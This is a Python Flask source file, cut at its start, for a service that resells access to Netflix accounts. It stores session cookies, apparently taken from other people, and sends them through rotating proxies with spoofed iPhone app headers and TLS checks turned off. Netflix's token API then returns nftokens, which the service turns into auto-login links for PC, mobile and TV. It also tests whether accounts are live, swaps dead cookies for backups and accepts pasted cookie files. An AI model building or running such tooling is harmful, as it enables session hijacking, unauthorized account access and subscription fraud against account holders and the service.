    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NETFLIX_BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

class ProxyError(Exception): pass
class CookieError(Exception): pass

import proxies_list

def fetch_netflix_nftoken_api(netflix_id):
    headers = dict(NETFLIX_BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    
    proxy_dict = proxies_list.get_random_proxy()
    
    try:
        response = requests.get(
            NETFLIX_API_URL, params=NETFLIX_QUERY_PARAMS, headers=headers,
            proxies=proxy_dict, timeout=15, verify=False
        )
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError) as e:
        print(f"Lỗi Proxy / Mạng: {e}")
        raise ProxyError("Không thể kết nối qua Proxy")
        
    if response.status_code in [403, 429]:
        raise ProxyError("Proxy bị Netflix block (403/429)")
        
    response.raise_for_status()
    data = response.json()
    token_data = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
    token = token_data.get("token")
    if not token:
        raise CookieError("Netflix API không trả về token. Cookie có thể đã DIE.")
    return token

@app.route("/api/check_live_code", methods=["POST"])
def api_check_live_code():
    data = request.get_json(silent=True) or {}
    cookie_value = data.get("cookie", "").strip()
    if not cookie_value:
        return jsonify({"success": False, "error": "Please enter Access Code"}), 400
        
    database.init_db()
    acc_key_row = database.get_access_key(cookie_value)
    
    if not acc_key_row:
        return jsonify({"success": False, "error": "Invalid or non-existent access code."}), 400
        
    code = acc_key_row[0]
    assigned_email = acc_key_row[1]
    expire_at_str = acc_key_row[2] if len(acc_key_row) > 2 else None
    
    # Check expiration
    if expire_at_str:
        from datetime import datetime
        try:
            expire_date = datetime.strptime(expire_at_str, "%Y-%m-%d")
            expire_date = expire_date.replace(hour=23, minute=59, second=59)
            if datetime.now() > expire_date:
                database.delete_access_key(code)
                return jsonify({"success": False, "error": "Access code has expired and been disabled!"}), 400
        except Exception as e:
            print(f"Expiration parse error: {e}")
    
    acc = database.get_account_by_email(assigned_email)
    if not acc:
        rotated = database.rotate_access_key(code)
        if not rotated:
            return jsonify({"success": False, "error": "System ran out of backup Cookies!"}), 500
        return jsonify({"success": True, "message": "Old account died. The system has AUTOMATICALLY CHANGED to a new account for you. Please click Login Now!"})
        
    netflix_id = urllib.parse.unquote(acc[2])
    secure_netflix_id = urllib.parse.unquote(acc[3]) if acc[3] else ""
    
    import checker
    try:
        status, plan = checker.check_account_live(netflix_id, secure_netflix_id, check_payment=True)
        if status == "LIVE":
            if plan:
                database.update_plan(assigned_email, plan)
            return jsonify({"success": True, "message": f"Account is LIVE normally! Plan: {plan or 'Unknown'}."})
        else:
            # DIE hoặc ERROR -> xóa acc cũ và đổi acc mới
            database.delete_account(assigned_email)
            rotated = database.rotate_access_key(code)
            if not rotated:
                return jsonify({"success": False, "error": "Old account died but System ran out of backup Cookies!"}), 500
            return jsonify({"success": True, "message": "Account was faulty and has been AUTOMATICALLY CHANGED to a new account. You can click Login Now!"})
    except Exception as e:
        return jsonify({"success": False, "error": f"Proxy check error. Please try again later. Details: {e}"}), 500

@app.route("/api/force_rotate_code", methods=["POST"])
def api_force_rotate_code():
    data = request.get_json(silent=True) or {}
    cookie_value = data.get("cookie", "").strip()
    if not cookie_value:
        return jsonify({"success": False, "error": "Please enter Access Code"}), 400
        
    database.init_db()
    acc_key_row = database.get_access_key(cookie_value)
    
    if not acc_key_row:
        return jsonify({"success": False, "error": "Invalid or non-existent access code."}), 400
        
    code = acc_key_row[0]
    assigned_email = acc_key_row[1]
    
    # We can delete the old account from the database since it's probably broken/unwanted
    database.delete_account(assigned_email)
    
    rotated = database.rotate_access_key(code)
    if not rotated:
        return jsonify({"success": False, "error": "System ran out of backup Cookies!"}), 500
        
    return jsonify({"success": True, "message": "Successfully changed to a new account! Please Check & Fix again."})

@app.route("/api/generate_nftoken", methods=["POST"])
def api_generate_nftoken():
    def register_fail(err_msg, status_code=400):
        return jsonify({"success": False, "error": err_msg}), status_code

    try:
        data = request.get_json(silent=True) or {}
        cookie_value = data.get("cookie", "").strip()
        if not cookie_value:
            return register_fail("Please enter Access Code")
            
        database.init_db()
        
        # Import checker for realtime check
        import checker
        
        # 1. Lookup as access key (6 characters)
        acc_key_row = database.get_access_key(cookie_value)
    
        if acc_key_row:
            code = acc_key_row[0]
            assigned_email = acc_key_row[1]
            expire_at_str = acc_key_row[2] if len(acc_key_row) > 2 else None
            
            # Check expiration
            if expire_at_str:
                from datetime import datetime
                try:
                    expire_date = datetime.strptime(expire_at_str, "%Y-%m-%d")
                    expire_date = expire_date.replace(hour=23, minute=59, second=59)
                    if datetime.now() > expire_date:
                        database.delete_access_key(code)
                        return register_fail("Access code has expired and been disabled!")
                except Exception as e:
                    print(f"Expiration parse error: {e}")
            
            # Auto-rotation loop
            max_attempts = 5
            for attempt in range(max_attempts):
                acc = database.get_account_by_email(assigned_email)
                
                if not acc:
                    rotated = database.rotate_access_key(code)
                    if not rotated:
                        return jsonify({"success": False, "error": "System ran out of backup Cookies!"}), 500
                    assigned_email = database.get_access_key(code)[1]
                    continue
                    
                netflix_id = urllib.parse.unquote(acc[2])
                secure_netflix_id = urllib.parse.unquote(acc[3]) if acc[3] else ""
                
                try:
                    # BYPASS BACKGROUND LIVE CHECK - EXPORT LINK DIRECTLY
                    token = fetch_netflix_nftoken_api(netflix_id)
                    pc_link = f"https://www.netflix.com/login?nftoken={token}"
                    mobile_link = f"https://www.netflix.com/unsupported?nftoken={token}"
                    tv_link = f"https://www.netflix.com/tv8?nftoken={token}"

                    return jsonify({
                        "success": True,
                        "pc_link": pc_link,
                        "mobile_link": mobile_link,
                        "tv_link": tv_link
                    })
                except ProxyError as e:
                    print(f"Proxy error ({e}), retrying...")
                    continue
                except Exception as e:
                    print(f"Cookie {assigned_email} DIE, attempting rotation... (Error: {e})")
                    database.delete_account(assigned_email)
                    rotated = database.rotate_access_key(code)
                    if not rotated:
                        return jsonify({"success": False, "error": "Cookie is broken and system ran out of backup Cookies!"}), 500
                    assigned_email = database.get_access_key(code)[1]
                    
            return jsonify({"success": False, "error": "Server overloaded or all proxies died. Please try again later."}), 500

        # If not an access key and length <= 20
        if len(cookie_value) <= 20 and not cookie_value.startswith("B"):
            return register_fail("Mã truy cập không hợp lệ hoặc không tồn tại.")

        # 2. Fallback: Parse raw tokens for admin testing
        netflix_id = None
        unquoted_cookie = urllib.parse.unquote(cookie_value)
        is_already_token = unquoted_cookie.startswith("B")
        
        if is_already_token:
            token = cookie_value 
            pc_link = f"https://www.netflix.com/login?nftoken={token}"
            mobile_link = f"https://www.netflix.com/unsupported?nftoken={token}"
            tv_link = f"https://www.netflix.com/tv8?nftoken={token}"
            tv_link = f"https://www.netflix.com/tv8?nftoken={token}"
            return jsonify({"success": True, "pc_link": pc_link, "mobile_link": mobile_link, "tv_link": tv_link})
        
        if "NetflixId=" in cookie_value:
            match = re.search(r'NetflixId\s*=\s*([^;]+)', cookie_value)
            if match:
                netflix_id = match.group(1).strip()
        elif ".netflix.com" in cookie_value:
            for line in cookie_value.splitlines():
                parts = line.split("\t")
                if len(parts) >= 7 and parts[5].strip() == "NetflixId":
                    netflix_id = parts[6].strip()
                    break
        else:
            netflix_id = cookie_value.replace('"', '').replace("'", "").strip()
            
        if not netflix_id:
            netflix_id = cookie_value
            
        netflix_id = urllib.parse.unquote(netflix_id)
        
        try:
            token = fetch_netflix_nftoken_api(netflix_id)
            pc_link = f"https://www.netflix.com/login?nftoken={token}"
            mobile_link = f"https://www.netflix.com/unsupported?nftoken={token}"
            tv_link = f"https://www.netflix.com/tv8?nftoken={token}"
            tv_link = f"https://www.netflix.com/tv8?nftoken={token}"
            return jsonify({"success": True, "pc_link": pc_link, "mobile_link": mobile_link, "tv_link": tv_link})
        except ProxyError as e:
            return jsonify({"success": False, "error": f"Lỗi Proxy. Vui lòng bấm thử lại. Chi tiết: {str(e)}"}), 500
        except Exception as e:
            return register_fail(f"Token lỗi: {str(e)}", 500)
            
    except Exception as api_e:
        import traceback
        traceback.print_exc()
        return jsonify({"success": False, "error": f"Lỗi hệ thống không xác định: {str(api_e)}"}), 500

if __name__ == "__main__":
    print("🚀 Web interface is running!")
    print("👉 Please open your browser and go to: http://127.0.0.1:5000")
    app.run(host="0.0.0.0", port=5000, debug=False)
